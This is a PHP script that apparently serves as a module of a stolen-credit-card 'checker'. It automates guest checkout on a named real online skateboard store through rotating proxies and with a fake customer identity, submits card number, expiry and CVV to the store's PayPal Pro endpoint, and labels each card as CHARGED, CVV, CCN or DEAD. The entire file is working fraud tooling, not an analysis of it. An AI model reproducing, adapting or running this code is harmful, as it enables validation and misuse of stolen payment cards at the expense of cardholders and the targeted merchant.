<?php

$retry = 0;

$isRetry = False;

start:

if ($isRetry) {
	$retry++;

	$this->curlx->DeleteCookie();
}

if ($retry > 2) {
	if (empty($empty)) $empty = 'Maximum Retrys Reached';

	$status = ['emoji' => '❌', 'status' => 'DECLINED', 'msg' => "RETRY - $empty!"];

	goto end;
}

$isRetry = True;

$server = $this->proxy();

$fake = $this->tools->GetUser();

$cookie = uniqid();

$data = 'quantity=1&product_id=4756';

$r1 = $this->curlx->Post('https://www.customskateboards.com/index.php?route=checkout/cart/add', $data, null, $cookie, $server['proxy']);

if (!$r1->success) goto start;

$r2 = $this->curlx->Get('https://www.customskateboards.com/index.php?route=checkout/checkout', null, $cookie, $server['proxy']);

if (!$r2->success) goto start;

$data = 'customer_group_id=1&firstname='.$fake->first.'&lastname='.$fake->last.'&email='.urlencode($fake->email).'&telephone=2564567654&fax=&company=&address_1=12+main+street&address_2=&city=Brewster&postcode=10509&country_id=223&zone_id=3655&shipping_address=1';

$r3 = $this->curlx->Post('https://www.customskateboards.com/index.php?route=checkout/guest/save', $data, null, $cookie, $server['proxy']);

if (!$r3->success) goto start;

$r4 = $this->curlx->Get('https://www.customskateboards.com/index.php?route=checkout/shipping_method', null, $cookie, $server['proxy']);

if (!$r4->success) goto start;

$data = 'shipping_method=ups.03&comment=';

$r5 = $this->curlx->Post('https://www.customskateboards.com/index.php?route=checkout/shipping_method/save', $data, null, $cookie, $server['proxy']);

if (!$r5->success) goto start;

$r6 = $this->curlx->Get('https://www.customskateboards.com/index.php?route=checkout/payment_method', null, $cookie, $server['proxy']);

if (!$r6->success) goto start;

$data = 'payment_method=pp_pro&comment=';

$r7 = $this->curlx->Post('https://www.customskateboards.com/index.php?route=checkout/payment_method/save', $data, null, $cookie, $server['proxy']);

if (!$r7->success) goto start;

$r8 = $this->curlx->Get('https://www.customskateboards.com/index.php?route=checkout/confirm', null, $cookie, $server['proxy']);

if (!$r8->success) goto start;

$cc_type = ([
	'3' => 'AMEX',
	'4' => 'VISA',
	'5' => 'MASTERCARD',
	'6' => 'DISCOVER'
])[substr($cc, 0, 1)] ?? 'unknown';

$data = 'cc_type='.$cc_type.'&cc_number='.$cc.'&cc_start_date_month=01&cc_start_date_year=2013&cc_expire_date_month='.$mm.'&cc_expire_date_year='.$yyyy.'&cc_cvv2='.$cvv.'&cc_issue=';

$r9 = $this->curlx->Post('https://www.customskateboards.com/index.php?route=extension/payment/pp_pro/send', $data, null, $cookie, $server['proxy']);

if (!$r9->success) goto start;

$this->curlx->DeleteCookie();

$json_r9 = json_decode($r9->body);

if (isset($json_r9->success) || isset($json_r9->redirect)) {
	$status = ['status' => 'APPROVED', 'emoji' => '✅', 'msg' => 'CHARGED - Payment was Successful!'];

	goto end;
}

$err = $json_r9->error ?? 'Unknown Error';

if (empty($json_r9->error ?? '')) file_put_contents('pfp_29.96_err.txt', $r9->body . PHP_EOL, FILE_APPEND);

if (strpos($r9->body, 'AVS') !== false) {
	$status = ['status' => 'APPROVED', 'emoji' => '✅', 'msg' => "AVS FAILED - {$err}!"];
} elseif (strpos($r9->body, 'Insufficient funds') !== false) {
	$status = ['status' => 'APPROVED', 'emoji' => '✅', 'msg' => "CVV CARD - {$err}!"];
} elseif (strpos($r9->body, 'Credit Card Verification Number') !== false) {
	$status = ['status' => 'APPROVED', 'emoji' => '✅', 'msg' => "CCN CARD - {$err}!"];
} else {
	$status = ['status' => 'DECLINED', 'emoji' => '❌', 'msg' => "DEAD - {$err}!"];
}

end: